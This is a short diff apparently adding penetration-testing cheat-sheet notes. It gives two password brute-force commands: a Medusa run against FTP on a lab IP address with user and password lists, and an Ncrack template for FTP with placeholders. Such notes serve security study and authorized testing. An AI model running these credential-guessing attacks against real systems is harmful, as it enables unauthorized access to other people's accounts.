@@ -1,0 +1,5 @@
+Medusa
+     medusa -h 10.11.1.227 -U lab-users.txt -P lab-passwords.txt -M ftp | grep "ACCOUNT FOUND"
+
+Ncrack (FTP, SSH, TELNET, HTTP(S), POP3(S), SMB, RDP, VNC)
+     ncrack -U <[USERS_LIST]> -P <[PASSWORDS_LIST]> ftp://<[IP]>
